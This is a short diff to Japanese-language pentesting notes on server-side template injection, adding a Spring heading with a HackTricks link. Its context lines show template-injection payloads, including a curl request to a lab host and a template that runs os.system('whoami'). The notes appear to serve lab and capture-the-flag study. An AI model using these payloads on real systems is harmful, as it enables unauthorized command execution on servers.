@@ -99,6 +99,10 @@ curl --globoff "http://vulnnet.thm:8080/{{request|attr('application')|attr('\x5f
 {% import os %}{{ os.system("whoami") }}
 ```
 
+## Spring
+
+https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=spring%20ssti#spring-framework-java
+
 ## SSTImap 自動化
 
 ### インストール
